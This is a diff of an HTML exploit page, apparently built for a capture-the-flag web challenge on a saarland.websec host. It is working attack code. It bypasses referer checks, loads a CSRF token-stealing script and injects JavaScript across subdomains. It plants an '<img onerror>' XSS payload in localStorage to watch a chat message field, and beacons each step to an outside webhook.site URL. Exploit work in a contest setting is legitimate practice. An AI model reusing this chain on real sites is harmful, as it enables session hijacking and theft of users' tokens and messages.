@@ -1,27 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Bot Debugger</title></head>
+<head>
+    <title>Owley Exploit</title>
+    <!-- BYPASS REFERER CHECKS: This makes the bot look like it's requesting the script directly -->
+    <meta name="referrer" content="no-referrer">
+</head>
 <body>
+    <!-- 1. The Dummy Form for the CSRF script -->
     <form id="csrf_target_form"></form>
 
     <script>
         const W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
-        
-        // TRIPWIRE 1: Catch hidden JavaScript errors
-        window.onerror = function(message, source, lineno, colno, error) {
-            new Image().src = W + "/?bot_error=" + btoa(message + " at line " + lineno);
-        };
-
-        // TRIPWIRE 2: Catch the bot closing the page early
-        window.addEventListener("beforeunload", function (e) {
-            new Image().src = W + "/?bot_leaving_page_early";
-        });
-
         new Image().src = W + "/?step=1_github_started";
     </script>
 
-    <!-- The Token Stealer -->
-    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
+    <!-- 2. The Token Stealer (Now with an error catcher) -->
+    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js" 
+            onerror="new Image().src = W + '/?error=script_failed_to_load'"></script>
 
     <script>
         (function() {
@@ -41,16 +36,19 @@
                     clearInterval(tokenHunter);
                     new Image().src = W + "/?step=error_timeout_no_token";
                 }
-            }, 50); // Sped up to 50ms to beat impatient bots
+            }, 50);
 
             function executePayload(token) {
                 const innerJS = `
                     document.domain='owley-madison.jeopardy.websec.saarland';
                     new Image().src='${W}/?step=4_diary_xss_firing';
+                    
                     var i=document.createElement('iframe');
                     i.src='https://match.owley-madison.jeopardy.websec.saarland/';
+                    
                     i.onload=function(){
                         new Image().src='${W}/?step=5_iframe_ready';
+                        
                         var trap = "var wait=setInterval(function(){" +
                                    "  var m=parent.document.getElementById('message');" +
                                    "  if(m && m.value.length > 5){" + 
@@ -58,8 +56,10 @@
                                    "    clearInterval(wait);" +
                                    "  }" +
                                    "}, 500);";
+
                         var p = '</option><img src=x onerror="' + trap + '">';
                         i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
+                        
                         new Image().src='${W}/?step=6_poisoned_redirecting';
                         window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';
                     };
